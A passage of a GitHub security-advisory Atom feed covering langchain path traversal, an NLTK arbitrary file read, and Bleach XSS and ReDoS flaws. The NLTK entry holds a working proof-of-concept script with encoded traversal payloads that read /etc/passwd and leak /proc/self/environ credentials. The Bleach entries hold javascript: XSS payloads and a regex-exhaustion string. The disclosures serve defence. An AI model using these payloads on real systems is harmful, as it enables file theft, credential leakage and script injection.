            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9c59-2mvc-vfr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-16T17:34:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-anthropic] LangChain: Path traversal and sandbox escape in LangChain file-search middleware and loaders]]></title>
        <id>https://github.com/advisories/GHSA-gr75-jv2w-4656</id>
        <link href="https://github.com/advisories/GHSA-gr75-jv2w-4656"/>
        <updated>2026-06-16T15:03:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Several LangChain components that resolve filesystem paths or expand search patterns do not consistently confine the <em>resolved</em> path to the intended root directory. Affected behaviors include: a file-search agent middleware that validates a starting directory but not the search pattern or the resolved target of matched files, so glob patterns and symlinks can reach files outside the configured root; prompt- and chain/agent-configuration loaders that accept path fields and resolve them without confining the result to a trusted base or rejecting symlink targets; and path-prefix authorization checks that compare by string prefix without a path-segment boundary, so a sibling path sharing the prefix is accepted. When these components receive path values, search patterns, or workspace contents influenced by an untrusted source — including an LLM acting on untrusted input — the result can be disclosure of files outside the intended boundary. We have no evidence of this behavior being triggered in the wild.</p>
<h2 id="affected-users--systems">Affected users / systems</h2>
<p>You may be affected if you expose an agent with filesystem-search middleware over a directory and accept prompts or retrieved content influenced by untrusted sources; load prompt or chain/agent configuration from untrusted or shared sources; or rely on path-prefix restrictions to confine tool file access. Callers that confine these components to fully trusted inputs and first-party configuration are not affected.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Confidentiality: disclosure of file contents outside the intended root/sandbox.</li>
<li>Authorization: path-prefix bypass can grant access to sibling resources beyond the intended subtree.</li>
</ul>
<h2 id="patches--mitigation">Patches / mitigation</h2>
<p>The affected components will canonicalize candidate paths (resolving symlinks) and verify the resolved real path remains within the configured root before reading or returning it; search patterns will be normalized so they cannot escape the root; configuration loaders will confine resolved path fields and reject symlink escapes unless the caller explicitly opts in to dangerous loading; and path-prefix checks will enforce a path-segment boundary. Path validation will be made operating-system-portable.</p>
<h2 id="compatibility">Compatibility</h2>
<p>Callers that already pass only in-root paths, validated configuration, and trusted search inputs see no behavioral change. Callers that intentionally reference external paths can opt in via the existing dangerous-loading flag.</p>
<h2 id="operational-guidance">Operational guidance</h2>
<p>Confine filesystem-backed agent tools to a dedicated directory and prefer running them sandboxed/containerized; validate path and identifier inputs where untrusted input enters; do not enable dangerous loading for configuration whose origin you do not control.</p>
<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
<p>This issue concerns library components executed by agents.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langchain/security/advisories/GHSA-gr75-jv2w-4656">https://github.com/langchain-ai/langchain/security/advisories/GHSA-gr75-jv2w-4656</a></li>
<li><a href="https://github.com/advisories/GHSA-gr75-jv2w-4656">https://github.com/advisories/GHSA-gr75-jv2w-4656</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gr75-jv2w-4656</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T15:03:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] LangChain: Path traversal and sandbox escape in LangChain file-search middleware and loaders]]></title>
        <id>https://github.com/advisories/GHSA-gr75-jv2w-4656</id>
        <link href="https://github.com/advisories/GHSA-gr75-jv2w-4656"/>
        <updated>2026-06-16T15:03:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Several LangChain components that resolve filesystem paths or expand search patterns do not consistently confine the <em>resolved</em> path to the intended root directory. Affected behaviors include: a file-search agent middleware that validates a starting directory but not the search pattern or the resolved target of matched files, so glob patterns and symlinks can reach files outside the configured root; prompt- and chain/agent-configuration loaders that accept path fields and resolve them without confining the result to a trusted base or rejecting symlink targets; and path-prefix authorization checks that compare by string prefix without a path-segment boundary, so a sibling path sharing the prefix is accepted. When these components receive path values, search patterns, or workspace contents influenced by an untrusted source — including an LLM acting on untrusted input — the result can be disclosure of files outside the intended boundary. We have no evidence of this behavior being triggered in the wild.</p>
<h2 id="affected-users--systems">Affected users / systems</h2>
<p>You may be affected if you expose an agent with filesystem-search middleware over a directory and accept prompts or retrieved content influenced by untrusted sources; load prompt or chain/agent configuration from untrusted or shared sources; or rely on path-prefix restrictions to confine tool file access. Callers that confine these components to fully trusted inputs and first-party configuration are not affected.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Confidentiality: disclosure of file contents outside the intended root/sandbox.</li>
<li>Authorization: path-prefix bypass can grant access to sibling resources beyond the intended subtree.</li>
</ul>
<h2 id="patches--mitigation">Patches / mitigation</h2>
<p>The affected components will canonicalize candidate paths (resolving symlinks) and verify the resolved real path remains within the configured root before reading or returning it; search patterns will be normalized so they cannot escape the root; configuration loaders will confine resolved path fields and reject symlink escapes unless the caller explicitly opts in to dangerous loading; and path-prefix checks will enforce a path-segment boundary. Path validation will be made operating-system-portable.</p>
<h2 id="compatibility">Compatibility</h2>
<p>Callers that already pass only in-root paths, validated configuration, and trusted search inputs see no behavioral change. Callers that intentionally reference external paths can opt in via the existing dangerous-loading flag.</p>
<h2 id="operational-guidance">Operational guidance</h2>
<p>Confine filesystem-backed agent tools to a dedicated directory and prefer running them sandboxed/containerized; validate path and identifier inputs where untrusted input enters; do not enable dangerous loading for configuration whose origin you do not control.</p>
<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
<p>This issue concerns library components executed by agents.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langchain/security/advisories/GHSA-gr75-jv2w-4656">https://github.com/langchain-ai/langchain/security/advisories/GHSA-gr75-jv2w-4656</a></li>
<li><a href="https://github.com/advisories/GHSA-gr75-jv2w-4656">https://github.com/advisories/GHSA-gr75-jv2w-4656</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gr75-jv2w-4656</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T15:03:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK): URL-Encoded Path Traversal in nltk.data.load() Allows Arbitrary Local File Read]]></title>
        <id>https://github.com/advisories/GHSA-p4gq-832x-fm9v</id>
        <link href="https://github.com/advisories/GHSA-p4gq-832x-fm9v"/>
        <updated>2026-06-16T14:34:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>nltk.data.load() in NLTK is vulnerable to path traversal via URL-encoded path separators and traversal segments when using the nltk: URL scheme. The unsafe-path regex check is performed before url2pathname() decodes the %xx sequences (a classic decode-after-check / TOCTOU-style flaw), allowing an attacker to bypass the protection documented in NLTK's SECURITY.md and read arbitrary files from the filesystem.
While literal traversal strings such as ../../../etc/passwd are correctly blocked, encoded variants such as %2fetc%2fpasswd, %2e%2e%2f..., and ..%2f..%2f slip past the regex and are subsequently decoded into a real filesystem path.</p>
<h3 id="affected-component">Affected Component</h3>
<p>nltk/data.py — find(), normalize_resource_url(), and the _UNSAFE_NO_PROTOCOL_RE regex check.
Relevant occurrences:</p>
<p>data.py L650–L653 — final path constructed from url2pathname(resource_name) after checks
data.py L54–L69 — _UNSAFE_NO_PROTOCOL_RE operates only on the undecoded string
data.py L219–L245 — normalize_resource_url() for nltk: scheme contributes to decode-after-check
data.py L615–L618 — defense-in-depth traversal check also operates on undecoded input</p>
<h1 id="root-cause-the-regex-_unsafe_no_protocol_re-is-matched-against-the-raw-resource-string-path-normalization-via-url2pathname-happens-later-so-any-percent-encoded--2f-or--2e-is-invisible-to-the-regex-but-becomes-active-in-the-final-path--proof-of-concept---nltk-arbitrary-file-read-via-url-encoded-path-traversal">Root Cause
The regex _UNSAFE_NO_PROTOCOL_RE is matched against the raw resource string. Path normalization via url2pathname() happens later, so any percent-encoded / (%2f) or . (%2e) is invisible to the regex but becomes active in the final path.
### Proof of Concept
```
"""
NLTK Arbitrary File Read via URL-Encoded Path Traversal</h1>
<p>Bypasses _UNSAFE_NO_PROTOCOL_RE security regex in nltk/data.py
by URL-encoding path separators and traversal components.</p>
<p>Affected: NLTK &lt;= 3.9.4 (default ENFORCE=False configuration)
CWE: CWE-22 (Path Traversal)</p>
<p>Root Cause:
  nltk/data.py:find() checks resource names against a regex for
  traversal patterns (../, leading /, etc.) BEFORE calling
  url2pathname() which decodes %xx sequences. This is a classic
  "decode-after-check" vulnerability.
"""</p>
<p>import sys
import os
import warnings</p>
<h1 id="suppress-nltk-security-warnings-for-clean-poc-output">Suppress NLTK security warnings for clean PoC output</h1>
<p>warnings.filterwarnings("ignore", category=RuntimeWarning)</p>
<h1 id="setup">Setup</h1>
<p>sys.path.insert(0, os.path.join(os.path.dirname(<strong>file</strong>), "nltk"))
os.makedirs(os.path.expanduser("~/nltk_data/corpora"), exist_ok=True)</p>
<p>import nltk
from nltk.pathsec import ENFORCE</p>
<h1 id="banner-">BANNER = """</h1>
<h1 id="nltk-url-encoded-path-traversal-poc--affected-nltk--394--default-enforceenforce"> NLTK URL-Encoded Path Traversal PoC
 Affected: nltk &lt;= 3.9.4
 Default ENFORCE={enforce}</h1>
<p>""".format(enforce=ENFORCE)</p>
<p>def test_variant(name, payload, fmt="raw"):
    """Test a single traversal variant."""
    try:
        content = nltk.data.load(payload, format=fmt)
        if isinstance(content, bytes):
            preview = content[:200].decode("utf-8", errors="replace")
        else:
            preview = content[:200]
        first_line = preview.split("\n")[0]
        print(f"  [VULN] {name}")
        print(f"         Payload: {payload}")
        print(f"         Read OK: {first_line}")
        return True
    except Exception as e:
        print(f"  [SAFE] {name}")
        print(f"         Payload: {payload}")
        print(f"         Blocked: {type(e).<strong>name</strong>}: {e}")
        return False</p>
<p>def main():
    print(BANNER)
    vulns = 0</p>
<pre><code># --- Variant 1: URL-encoded absolute path ---
print("[1] URL-encoded absolute path (%2f = /)")
if test_variant(
    "Encoded leading slash bypasses ^/ regex check",
    "nltk:%2fetc%2fpasswd",
):
    vulns += 1

print()

# --- Variant 2: Encoded dot-dot traversal ---
print("[2] URL-encoded dot-dot traversal (%2e = .)")
if test_variant(
    "Encoded dots bypass \\.\\./ regex check",
    "nltk:corpora/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
):
    vulns += 1

print()

# --- Variant 3: Literal dots with encoded slash ---
print("[3] Literal dots with encoded slash (..%2f)")
if test_variant(
    "Encoded slash after literal .. bypasses \\.\\./ regex",
    "nltk:corpora/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
):
    vulns += 1

print()

# --- Variant 4: Read process environment (credential leak) ---
print("[4] Read /proc/self/environ (credential leakage)")
try:
    content = nltk.data.load("nltk:%2fproc%2fself%2fenviron", format="raw")
    env_vars = content.decode("utf-8", errors="replace").split("\x00")
    print(f"  [VULN] Leaked {len(env_vars)} environment variables")
    for var in env_vars[:3]:
        if var:
            key = var.split("=")[0] if "=" in var else var
            print(f"         {key}=...")
    vulns += 1
except Exception as e:
    print(f"  [SAFE] Blocked: {e}")

print()

# --- Control: verify normal traversal IS blocked ---
print("[CONTROL] Verify literal ../ is blocked by regex")
test_variant("Direct traversal (should be blocked)", "nltk:../../../etc/passwd")

print()
print("=" * 51)
print(f" Result: {vulns} bypass variant(s) succeeded")
if vulns &gt; 0:
    print(" Status: VULNERABLE (url2pathname decodes after regex check)")
else:
    print(" Status: Not vulnerable")
print("=" * 51)
</code></pre>
<p>if <strong>name</strong> == "<strong>main</strong>":
    main()</p>
<pre><code>### Impact
Arbitrary local file read whenever attacker-controlled input reaches nltk.data.load(). Realistic targets include:

/etc/passwd, /etc/shadow (if readable)
/proc/self/environ — leaks environment variables, often containing API keys, DB credentials, cloud secrets
Application source code and configuration files
Cloud metadata, deployment secrets, SSH keys

This is directly relevant to web applications, hosted notebook services, multi-tenant ML pipelines, and CI/CD systems that pass untrusted resource identifiers into NLTK. NLTK's SECURITY.md explicitly places path traversal within the scope of its protection model, so this is a documented security boundary being broken.
### References

- &lt;https://github.com/nltk/nltk/security/advisories/GHSA-p4gq-832x-fm9v&gt;
- &lt;https://github.com/advisories/GHSA-p4gq-832x-fm9v&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p4gq-832x-fm9v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-16T14:34:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bleach] Bleach clean() / Cleaner() fails to sanitize dangerous URI schemes in allowed formaction attributes]]></title>
        <id>https://github.com/advisories/GHSA-gj48-438w-jh9v</id>
        <link href="https://github.com/advisories/GHSA-gj48-438w-jh9v"/>
        <updated>2026-06-16T14:07:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bleach <code>clean()</code> / <code>Cleaner()</code> fails to sanitize dangerous URI schemes in allowed <code>formaction</code> attributes.</p>
<p>Bleach applies URI protocol sanitization only to attributes listed in <code>attr_val_is_uri</code>. While URI-bearing attributes such as <code>action</code>, <code>href</code>, <code>src</code>, and <code>poster</code> are included in that set, <code>formaction</code> is not. As a result, if a downstream application explicitly allows <code>formaction</code> on submit-capable controls in untrusted HTML, Bleach preserves dangerous values such as <code>javascript:alert(1)</code> instead of stripping them.</p>
<p>This can lead to <strong>submit-triggered JavaScript execution</strong> in applications that rely on Bleach to sanitize untrusted HTML and allow the relevant tag/attribute combination.</p>
<hr>
<h3 id="details">Details</h3>
<p>The issue appears to be a URI-sanitization coverage gap in Bleach’s sanitizer logic.</p>
<p>Relevant code paths:</p>
<ul>
<li><code>bleach/sanitizer.py</code> — <code>BleachSanitizerFilter.allow_token</code> (around line 553)</li>
<li><code>bleach/_vendor/html5lib/filters/sanitizer.py</code> — <code>attr_val_is_uri</code> (around line 525)</li>
</ul>
<p>In <code>BleachSanitizerFilter.allow_token</code>, URI protocol sanitization is only applied when:</p>
<pre><code class="language-python">if namespaced_name in self.attr_val_is_uri:
</code></pre>
<p>However, <code>(None, 'formaction')</code> is currently missing from <code>attr_val_is_uri</code>.</p>
<p>This creates an inconsistency where <code>action</code> is protocol-sanitized, but <code>formaction</code> is not.</p>
<p>As a result, if a downstream application allows:</p>
<ul>
<li>tags such as <code>&lt;button&gt;</code> or <code>&lt;input&gt;</code></li>
<li>the <code>formaction</code> attribute</li>
</ul>
<p>then Bleach preserves dangerous URI schemes such as <code>javascript:</code> in <code>formaction</code>.</p>
<p>Examples of affected submit-capable controls include:</p>
<ul>
<li><code>&lt;button&gt;</code> (default submit behavior unless <code>type="button"</code> is set)</li>
<li><code>&lt;input type="submit"&gt;</code></li>
<li><code>&lt;input type="image"&gt;</code></li>
</ul>
<p>This appears to be a real library-side sanitizer gap rather than only an application misuse issue, because Bleach already treats similar URI-bearing attributes (such as <code>action</code>) as protocol-sensitive and sanitizes them.</p>
<p>Suggested minimal fix:</p>
<p>Add:</p>
<pre><code class="language-python">(None, 'formaction')
</code></pre>
<p>to <code>attr_val_is_uri</code> in:</p>
<ul>
<li><code>bleach/_vendor/html5lib/filters/sanitizer.py</code></li>
</ul>
<p>I also prepared a minimal patch and focused regression tests if helpful.</p>
<hr>
<h3 id="poc">PoC</h3>
<p>Below are minimal reproductions using <code>bleach.clean()</code>.</p>
<h4 id="1-button">1) <code>&lt;button&gt;</code></h4>
<pre><code class="language-python">from bleach import clean

print(clean(
    '&lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt;go&lt;/button&gt;&lt;/form&gt;',
    tags={'form', 'button'},
    attributes={'button': ['formaction']},
))
</code></pre>
<p><strong>Actual output:</strong></p>
<pre><code class="language-html">&lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt;go&lt;/button&gt;&lt;/form&gt;
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code class="language-html">&lt;form&gt;&lt;button&gt;go&lt;/button&gt;&lt;/form&gt;
</code></pre>
<hr>
<h4 id="2-input-typesubmit">2) <code>&lt;input type="submit"&gt;</code></h4>
<pre><code class="language-python">print(clean(
    '&lt;form&gt;&lt;input type="submit" formaction="javascript:alert(1)" value="go"&gt;&lt;/form&gt;',
    tags={'form', 'input'},
    attributes={'input': ['type', 'formaction', 'value']},
))
</code></pre>
<p><strong>Actual output:</strong></p>
<pre><code class="language-html">&lt;form&gt;&lt;input type="submit" formaction="javascript:alert(1)" value="go"&gt;&lt;/form&gt;
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code class="language-html">&lt;form&gt;&lt;input type="submit" value="go"&gt;&lt;/form&gt;
</code></pre>
<hr>
<h4 id="3-input-typeimage">3) <code>&lt;input type="image"&gt;</code></h4>
<pre><code class="language-python">print(clean(
    '&lt;form&gt;&lt;input type="image" formaction="javascript:alert(1)" src="/foo.png"&gt;&lt;/form&gt;',
    tags={'form', 'input'},
    attributes={'input': ['type', 'formaction', 'src']},
))
</code></pre>
<p><strong>Actual output:</strong></p>
<pre><code class="language-html">&lt;form&gt;&lt;input type="image" formaction="javascript:alert(1)" src="/foo.png"&gt;&lt;/form&gt;
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code class="language-html">&lt;form&gt;&lt;input type="image" src="/foo.png"&gt;&lt;/form&gt;
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>This is a <strong>client-side HTML sanitization bypass / dangerous URI preservation issue</strong>.</p>
<p>If an application relies on Bleach to sanitize untrusted HTML and explicitly allows:</p>
<ul>
<li><code>formaction</code></li>
<li>and submit-capable controls such as <code>&lt;button&gt;</code> or <code>&lt;input&gt;</code></li>
</ul>
<p>then Bleach can emit sanitized output that still contains a dangerous <code>javascript:</code> URI in <code>formaction</code>.</p>
<p>That can lead to <strong>submit-triggered JavaScript execution</strong> when the user activates the control.</p>
<p>Impact is limited to configurations that explicitly allow the relevant tag/attribute combination, but the issue is still security-relevant because:</p>
<ul>
<li><code>formaction</code> is a real browser sink</li>
<li>Bleach already protocol-sanitizes similar URI-bearing attributes like <code>action</code></li>
<li>the omission creates inconsistent sanitizer coverage for dangerous URI schemes</li>
</ul>
<p>I would currently assess this as <strong>Medium severity</strong>.</p>
<p>If useful, I also have:</p>
<ul>
<li><p>a minimal patch</p>
</li>
<li><p>focused regression tests for:</p>
<ul>
<li><code>&lt;button formaction="javascript:..."&gt;</code></li>
<li><code>&lt;input type="submit" formaction="javascript:..."&gt;</code></li>
<li><code>&lt;input type="image" formaction="javascript:..."&gt;</code></li>
<li>a safe control case where <code>formaction="/submit"</code> is preserved</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/bleach/security/advisories/GHSA-gj48-438w-jh9v">https://github.com/mozilla/bleach/security/advisories/GHSA-gj48-438w-jh9v</a></li>
<li><a href="https://github.com/mozilla/bleach/releases/tag/v6.4.0">https://github.com/mozilla/bleach/releases/tag/v6.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gj48-438w-jh9v">https://github.com/advisories/GHSA-gj48-438w-jh9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj48-438w-jh9v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T14:07:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bleach] Bleach linkify(parse_email=True) CPU exhaustion via unbounded email regex scanning]]></title>
        <id>https://github.com/advisories/GHSA-g75f-g53v-794x</id>
        <link href="https://github.com/advisories/GHSA-g75f-g53v-794x"/>
        <updated>2026-06-16T14:07:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Bleach 6.3.0 exposes a documented email-linkification path through <code>bleach.linkify(..., parse_email=True)</code>. The implementation scans attacker-controlled text with <code>EMAIL_RE.finditer()</code> over the full character token and has no length, timeout, or linear prefilter before applying the dot-atom email regex. A non-email payload around 30 KB causes multi-second CPU consumption per request/call, creating a direct availability risk for applications that enable email linkification on user-submitted text.</p>
<h2 id="affected-product">Affected Product</h2>
<ul>
<li>Package: <code>bleach</code></li>
<li>Ecosystem: pip</li>
<li>Affected versions: verified in <code>6.3.0</code>; exact first affected version not established</li>
<li>Patched versions: none known at finalization time</li>
<li>Tested version: <code>6.3.0</code></li>
<li>Audit commit/tag: <code>v6.3.0</code> / <code>5546d5dbce60d08ccb99d981778d74044d646d4e</code></li>
<li>PyPI sdist SHA256: <code>6f3b91b1c0a02bb9a78b5a454c92506aa0fdf197e1d5e114d2e00c6f64306d22</code></li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<ul>
<li>CWE: CWE-1333: Inefficient Regular Expression Complexity; related availability impact maps to CWE-400</li>
<li>Component: <code>bleach/linkifier.py</code>, <code>build_email_re()</code>, <code>LinkifyFilter.handle_email_addresses()</code></li>
<li>Root cause: <code>handle_email_addresses()</code> calls <code>self.email_re.finditer(text)</code> on attacker-controlled text. <code>EMAIL_RE</code> includes a repeated dot-atom local-part pattern, so non-email strings such as repeated <code>a.</code> segments with no <code>@</code> force repeated long failing scans.</li>
<li>Security boundary violated: user-submitted text processed by a documented safe linkification helper should not allow an attacker to impose superlinear CPU cost through non-email text.</li>
<li>Direct impact: per-request CPU exhaustion / denial-of-service risk in applications that enable <code>parse_email=True</code> on attacker-controlled text.</li>
<li>Chain impact, if any: one proof run observed an unrelated <code>/health</code> request delayed during a concurrent attack request, but this was not reliable across reviewer retests. Treat cross-request service degradation as environment-dependent supporting evidence, not the primary impact.</li>
<li>Severity estimate: Medium / availability-only. The feature is opt-in and deployment body limits/timeouts affect practical severity.</li>
</ul>
<p>Relevant code path:</p>
<ul>
<li><code>bleach/__init__.py:85-125</code>: public <code>linkify(text, ..., parse_email=False)</code> constructs <code>Linker(..., parse_email=parse_email)</code> and calls <code>linker.linkify(text)</code>.</li>
<li><code>bleach/linkifier.py:77-88</code>: <code>EMAIL_RE</code> is compiled from the dot-atom email pattern.</li>
<li><code>bleach/linkifier.py:292-301</code>: <code>handle_email_addresses()</code> applies <code>self.email_re.finditer(text)</code> to each character token.</li>
<li><code>bleach/linkifier.py:620-623</code>: character tokens are routed into email handling only when <code>parse_email</code> is true.</li>
<li><code>docs/goals.rst:30-40</code>: Bleach documents user comments, profile bios, and descriptions as target untrusted text use cases.</li>
<li><code>docs/linkify.rst:300-305</code>: <code>parse_email=True</code> is the documented option for creating <code>mailto:</code> links.</li>
</ul>
<h2 id="attack-preconditions">Attack Preconditions</h2>
<ul>
<li>The consuming application enables the documented <code>parse_email=True</code> option, for example <code>bleach.linkify(user_text, parse_email=True)</code> or <code>Linker(parse_email=True).linkify(user_text)</code>.</li>
<li>The attacker can submit text that reaches that linkification path. Authentication depends on the host application; a public comment form would make this unauthenticated, while account-only text fields require user privileges.</li>
<li>The application allows roughly 20-30 KB of text to reach Bleach and lacks a strict timeout or input cap before linkification.</li>
<li>No custom bounded <code>email_re</code> is supplied.</li>
</ul>
<h2 id="reproduction">Reproduction</h2>
<p>Minimal API trigger:</p>
<pre><code class="language-python">import bleach
payload = ("a." * 15000) + "a"
bleach.linkify(payload, parse_email=True)
</code></pre>
<p>The saved HTTP proof uses a local harness with <code>POST /preview</code> calling <code>bleach.linkify(request_body, parse_email=True)</code> and a control endpoint using <code>parse_email=False</code> on the same payload. The exploit sends baseline/control/attack requests over HTTP to <code>127.0.0.1</code>.</p>
<h2 id="proof-evidence">Proof Evidence</h2>
<p>The proof ran against Bleach <code>6.3.0</code> installed from the audited local checkout in an isolated temporary venv. It used Python <code>3.12.3</code> on Linux.</p>
<p>Measured HTTP proof results:</p>
<ul>
<li>Payload: <code>("a." * 15000) + "a"</code> (<code>30001</code> bytes)</li>
<li>Normal baseline <code>/preview</code> mean: <code>0.001425</code> seconds</li>
<li>Same 30 KB payload with <code>parse_email=False</code>: <code>0.048349</code> seconds</li>
<li>Attack payload with <code>parse_email=True</code>: <code>8.719818</code> seconds</li>
<li>Slowdown versus the larger baseline/control mean: <code>180.35x</code></li>
<li>Requests sent by proof: <code>20</code></li>
</ul>
<p>Evidence files:
<a href="https://github.com/user-attachments/files/27129729/poc.py">poc.py</a>
<a href="https://github.com/user-attachments/files/27129737/poc_results.json">poc_results.json</a>
<a href="https://github.com/user-attachments/files/27129751/exploit_proof.py">exploit_proof.py</a>
<a href="https://github.com/user-attachments/files/27129752/exploit_results.json">exploit_results.json</a></p>
<h2 id="scope-and-limitations">Scope and Limitations</h2>
<ul>
<li>This report does not claim XSS, authentication bypass, data disclosure, remote code execution, persistent crash, or persistent service outage.</li>
<li><code>parse_email=True</code> is not the default. The affected path is a documented opt-in feature.</li>
<li>The exact first affected version is not established.</li>
<li>Practical impact depends on host application input limits, worker model, request timeout policy, and whether untrusted users can submit text to an email-linkification path.</li>
<li>A reviewer reproduced the direct CPU cost but did not reproduce the proof harness’s <code>/health</code> delay. The direct impact claim is therefore limited to per-request CPU exhaustion.</li>
<li>Bleach is marked deprecated in <code>README.rst</code>, and <code>SECURITY.md</code> has stale supported-version text, but the package still has a 2025 PyPI release and published Mozilla security reporting routes.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/bleach/security/advisories/GHSA-g75f-g53v-794x">https://github.com/mozilla/bleach/security/advisories/GHSA-g75f-g53v-794x</a></li>
<li><a href="https://github.com/advisories/GHSA-g75f-g53v-794x">https://github.com/advisories/GHSA-g75f-g53v-794x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g75f-g53v-794x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T14:07:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bleach] Bleach: URI sanitization allows disallowed URI schemes with Unicode > U+00A0 in output]]></title>
        <id>https://github.com/advisories/GHSA-8rfp-98v4-mmr6</id>
        <link href="https://github.com/advisories/GHSA-8rfp-98v4-mmr6"/>
        <updated>2026-06-16T14:06:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A possible XSS bypass affects users calling <code>bleach.clean</code> with all of:</p>
<ul>
<li><code>a</code> in the allowed tags</li>
<li><code>href</code> in allowed attributes</li>
</ul>
<p>The <code>bleach.clean</code> sanitizer outputs URIs containing disallowed scheme patterns that it should be stripping. However, because the inserted Unicode characters make the scheme invalid per RFC 3986, modern browsers do not execute these as javascript: URIs. The practical security impact is limited to:</p>
<ul>
<li>Bleach's output contains URI values that violate the caller's protocol allowlist, breaking the sanitizer's contract.</li>
<li>If a downstream system performs its own Unicode normalization on bleach's output (stripping invisible characters before rendering), the javascript: scheme could become valid. This is a non-standard processing chain but represents a theoretical secondary risk.</li>
</ul>
<p>This is not a direct XSS vulnerability.</p>
<p>Python code example from reporter with Bleach v6.3.0 and Python 3.13:</p>
<pre><code>import bleach
payload1 = '&lt;a href="javascript\u200b:alert(document.cookie)"&gt;Click me&lt;/a&gt;'
result1 = bleach.clean(payload1)
print(f"(ZWSP): {repr(result1)}")
</code></pre>
<p>Output:</p>
<pre><code>(ZWSP): '&lt;a href="javascript\u200b:alert(document.cookie)"&gt;Click me&lt;/a&gt;'
</code></pre>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to Bleach 6.4.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Pre-process content removing non-ASCII characters from URI schemes before sanitizing with <code>bleach.clean</code>.</p>
<p>A strong<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"> Content-Security-Policy</a> without unsafe-inline and unsafe-eval<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"> script-srcs</a> will also help mitigate the risk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=2023812">https://bugzilla.mozilla.org/show_bug.cgi?id=2023812</a></li>
<li>RFC 3986, Section 3.1 (URI Scheme syntax): scheme characters are restricted to ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )</li>
</ul>
<h3 id="reported-by">Reported by</h3>
<p>Reported by codeant from CodeAnt AI.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/bleach/security/advisories/GHSA-8rfp-98v4-mmr6">https://github.com/mozilla/bleach/security/advisories/GHSA-8rfp-98v4-mmr6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=2023812">https://bugzilla.mozilla.org/show_bug.cgi?id=2023812</a></li>
<li><a href="https://github.com/advisories/GHSA-8rfp-98v4-mmr6">https://github.com/advisories/GHSA-8rfp-98v4-mmr6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8rfp-98v4-mmr6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-16T14:06:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Possible infinite loop when processing outlines/bookmarks in writer]]></title>
        <id>https://github.com/advisories/GHSA-m2v9-299j-rv96</id>
        <link href="https://github.com/advisories/GHSA-m2v9-299j-rv96"/>
        <updated>2026-06-16T14:05:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires merging a file with outlines into a writer.</p>
<h3 id="patches">Patches</h3>
